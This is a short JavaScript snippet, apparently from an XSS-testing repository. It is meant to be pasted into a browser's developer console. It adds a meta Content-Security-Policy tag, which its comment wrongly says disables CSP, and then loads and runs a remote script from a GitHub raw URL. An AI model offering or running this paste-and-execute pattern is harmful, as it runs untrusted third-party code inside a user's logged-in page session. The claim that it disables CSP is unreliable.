/**
This file contains the code snippet needed to be coded on the Developer Console
**/

/**
 Disables CSP from page
**/

function dynamicallyInsertCSP() {
        let metaElement = document.createElement("meta");
        metaElement.setAttribute("content", "default-src 'self' 'unsafe-inline';")
        metaElement.setAttribute("http-equiv", "Content-Security-Policy");
        document.head.appendChild(metaElement);
};

function inject() {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
    document.head.appendChild(script);
}

dynamicallyInsertCSP();
inject();
